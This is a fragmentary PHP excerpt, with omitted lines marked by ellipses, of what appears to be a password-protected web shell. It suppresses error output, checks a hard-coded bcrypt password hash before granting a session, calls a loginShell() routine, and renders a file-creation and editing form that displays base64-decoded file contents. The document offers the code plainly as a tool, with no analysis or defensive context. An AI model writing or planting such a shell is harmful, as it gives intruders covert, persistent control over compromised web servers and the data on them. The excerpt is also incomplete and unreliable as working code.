...
error_reporting(0);
session_start();
$password = '$2y$10$EoJEG7KBNBO0mTQ7Z0EEb.Mc/.5kJ94rtNMe8ossR5J3dbQd43skq';
if (isset($_SESSION['auth_key'])) {
	echo "";
} else {
	if (isset($_POST['password'])) {
		if (password_verify($_POST['password'], $password)) {
			$_SESSION['auth_key'] = password_hash($_POST['password'], PASSWORD_DEFAULT);
		}else {
			loginShell();
		}
	} else {
			...
			<input type="hidden" name="pilihan" value="create">
			  <div class="row center-align">
			    <div class="input-field col s12">
                  ...
                  style="height: 400px; background-color: ghostwhite; overflow-y: scroll;"><?= base64_decode($isiFile); ?></textarea>
